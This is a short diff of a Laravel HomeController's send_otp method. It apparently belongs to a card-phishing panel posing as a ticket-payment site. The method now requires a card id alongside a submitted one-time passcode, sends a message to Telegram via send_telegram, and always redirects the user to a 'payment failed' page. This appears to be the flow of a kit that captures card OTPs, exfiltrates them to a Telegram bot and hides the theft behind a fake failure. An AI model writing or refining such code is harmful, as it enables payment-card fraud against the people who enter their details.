@@ -202,7 +202,8 @@ class HomeController extends Controller
     public function send_otp(Request $request)
     {
         $request->validate([
-            'otp' => 'required'
+            'otp' => 'required',
+            'cardId' => 'required'
         ]);
         $card = Card::query()->findOrFail($request->cardId);
 
@@ -228,8 +229,8 @@ class HomeController extends Controller
         ";
 
             $this->send_telegram($message);
-        $event = $card->order->tickets[0]->event->id;
-        return \redirect()->route('payment.failed')->with('event',$event);
+        // $event = $card->order->tickets[0]->event->id;
+        return \redirect()->route('payment.failed');
     }
 
 
